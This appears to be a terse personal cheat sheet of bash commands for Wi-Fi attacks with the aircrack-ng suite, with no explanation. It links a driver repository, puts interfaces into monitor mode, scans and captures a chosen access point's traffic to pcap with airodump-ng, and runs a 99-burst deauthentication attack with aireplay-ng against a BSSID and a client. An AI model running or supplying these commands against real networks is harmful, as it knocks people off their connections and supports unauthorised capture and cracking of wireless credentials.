```bash
https://github.com/aircrack-ng/rtl8812au
```

```bash
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

ip link set wlan1 down
iw dev wlan1 set type monitor
ip link set wlan1 up
```

```bash
airmon-ng start wlan0
```

```bash
airodump-ng --manufacturer --beacons --showack --wps --uptime --band a wlan0
airodump-ng --manufacturer --beacons --showack --wps --uptime --band bg wlan0
```

```bash
airodump-ng --manufacturer --beacons --showack --wps --uptime \
            --band a --bssid 00:00:00:00:00:00 --channel 1 \
            --write-interval 5 --output-format pcap --write session0 wlan0
```

```bash
iwconfig wlan0 channel 4

aireplay-ng -0 99 -D -a BSSID -c TARGET wlan0
```

```bash
kill -9 `ps aux | grep -i aircrack | awk '{print $2}'`
```
